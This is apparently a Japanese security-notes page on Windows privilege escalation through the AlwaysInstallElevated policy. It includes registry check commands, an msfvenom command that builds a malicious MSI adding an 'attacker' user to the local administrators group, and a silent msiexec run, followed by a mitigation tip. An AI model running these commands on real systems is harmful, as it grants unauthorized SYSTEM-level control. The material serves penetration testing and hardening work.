---
title: AlwaysInstallElevated による MSI の SYSTEM 実行
date: 2026-10-17
category: Windows
topic: 権限昇格
tags: [windows, privilege-escalation, alwaysinstallelevated, msi]
summary: 2 つのレジストリ値が両方 1 になっていると、一般ユーザーが作った MSI インストーラが SYSTEM 権限で実行されてしまう
---

## 概要

Windows の MSI（Windows Installer）には、グループポリシーで「常に昇格した権限でインストールする（Always install with elevated privileges）」を有効にする設定がある。本来は、一般ユーザーに管理者承認なしでソフトウェアをインストールさせたい場合などに使われる設定だが、これが有効になっていると、一般ユーザーが作成した任意の MSI パッケージが SYSTEM 権限で実行されてしまう。

この設定は `HKCU` と `HKLM` の両方に対応するレジストリ値があり、両方が `1` になっている場合にのみ有効になる。片方だけでは成立しない。

## 手順

1. 対象の 2 つのレジストリ値がともに `1` になっているか確認する。
2. 両方 `1` であれば、任意のコマンドを実行する MSI パッケージを作成する。
3. 作成した MSI を実行する（`msiexec`）。SYSTEM 権限でインストーラのアクションが実行される。

## コマンド

```
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

両方が `1` の場合に成立する。

```
# 悪意ある MSI を生成
msfvenom -p windows/x64/exec CMD='net localgroup administrators attacker /add' -f msi -o evil.msi

:: 標的上で実行
msiexec /quiet /qn /i C:\temp\evil.msi
```

## 注意点

- この設定が有効になっていること自体が設定ミスであることが多く、見つければそのまま SYSTEM 権限につながる「刺さりやすい」パターン。棚卸しの際はレジストリ値を確認するだけで判定できる。
- 対策は、特別な理由がない限りこの設定を無効（`0` または未設定）にしておくこと。
